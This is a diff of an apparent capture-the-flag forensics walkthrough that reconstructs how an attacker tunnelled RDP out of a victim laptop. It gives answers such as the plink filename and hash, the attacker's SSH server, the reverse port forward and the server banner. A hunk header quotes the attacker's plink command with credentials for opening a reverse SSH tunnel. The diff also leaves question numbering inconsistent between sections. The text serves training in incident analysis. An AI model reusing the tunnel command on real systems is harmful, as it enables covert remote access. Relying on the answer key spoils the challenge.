@@ -164,39 +164,36 @@ The HR manager, faced a critical security breach when his laptop became the entr
 ****\******\*****************\*******\******** ******\******************
 ```
 
-#### Q28: There is a .bat file was created. Where is it? (Absolute Path including the filename)
+#### Q27: There is a .bat file was created. Where is it? (Absolute Path including the filename)
 ```
 C:\Users\Victim\Documents\FXS.bat
+*:\*****\******\*********\***.***
 ```
 
-
-#### Q29: As we noticed this hacker is smart. he never use the real filename. What is the real filename of the file he downloaded combined with its MD5 hash? <FILENAME.EXE>:MD5
+#### Q28: As we noticed this hacker is smart. he never use the real filename. What is the real filename of the file he downloaded combined with its MD5 hash? <FILENAME.EXE>:MD5
 ```
-plink.exe:CC62BA67C1200202D1DA784EA0313408
 *****.***:********************************
 ```
 
-#### Q30: Like you did notice this batch will be used in Establishing SSH Connection. What is the IP address of SSH Server and its Port? (<ip_addr>:<port>)
+#### Q29: Like you did notice this batch will be used in Establishing SSH Connection. What is the IP address of SSH Server and its Port? (<ip_addr>:<port>)
 ```
-192.168.1.2:443
 ***.***.*.*:***
 ```
 
-#### Q31: The actor used the technique of port forwarding to listen on the remote port: `ANS1`, and forward the requests to `ANS2`. ANS* = <ip_addr>:<port>
+#### Q30: The actor used the technique of port forwarding to listen on the remote port: `ANS1`, and forward the requests to `ANS2`. ANS* = <ip_addr>:<port>
 ```
-127.0.0.1:49800, 192.168.20.145:3389
 ASN1, ANS2
 ```
 
-#### Q32: What is the type of SSH Server that the attacker uses? (Software Name)
+#### Q31: What is the type of SSH Server that the attacker uses? (Software Name)
 ```
-SSH-2.0-9.38 FlowSsh: Bitvise SSH Server (WinSSHD) 9.38
 SSH-*.*-*.** *******:******** *** ****** (*******) *.**
 ```
 > [!TIP]
 > How many handshakes?
+> Push Harder
 
-#### Q33: Over this SSH Connection the Attacker was able to RDP. Can you identify the timestamp of the first time ? (Y-M-D 24:00)
+#### Q32: Over this SSH Connection the Attacker was able to RDP. Can you identify the timestamp of the first time ? (Y-M-D 24:00)
 
 ```
 2024-07-20 14:02
@@ -636,19 +633,35 @@ echo y|C:\Windows\Temp\ekern.exe -ssh -P 443 -l v1ctim -pw C@nt_D3f3nd -R 127.0.
 - Server IP = 192.168.1.2 , Port = 443 
 ##### - Answer :  `192.168.1.2:443`
 
-#### Q31: The actor used the technique of port forwarding to listen on the remote port: `ANS1`, and forward the requests to `ANS2`. ANS* = <ip_addr>:<port>
+<br>
+
+#### Q30: The actor used the technique of port forwarding to listen on the remote port: `ANS1`, and forward the requests to `ANS2`. ANS* = <ip_addr>:<port>
 ```
-127.0.0.1:49800, 192.168.20.145:3389
 ASN1, ANS2
 ```
+- `127.0.0.1:49800 ` is the local machine (server) where the reverse tunnel listens for incoming connections.
+- `192.168.20.145:3389` to which the reverse tunnel forwards the incoming connections. This is used to forward RDP requests.
+
+##### - Answer: `127.0.0.1:49800, 192.168.20.145:3389`
+
+<br>
 
 #### Q32: What is the type of SSH Server that the attacker uses? (Software Name)
 ```
-SSH-2.0-9.38 FlowSsh: Bitvise SSH Server (WinSSHD) 9.38
 SSH-*.*-*.** *******:******** *** ****** (*******) *.**
 ```
 > [!TIP]
 > How many handshakes?
+> Push Harder
+- Let's Get Back to Pcap
+- Filter: `ip.addr==192.168.1.2 and  tcp.port eq 443`
+- Let's Follow the TCP threeway handshake
+- Now Find PSH Flags and we got our answer
+![image](https://github.com/user-attachments/assets/6ce73cee-ab06-49b5-9759-4e48becf6d52)
+
+##### - Answer: `SSH-2.0-9.38 FlowSsh: Bitvise SSH Server (WinSSHD) 9.38`
+
+<br>
 
 #### Q33: Over this SSH Connection the Attacker was able to RDP. Can you identify the timestamp of the first time ? (Y-M-D 24:00)
 
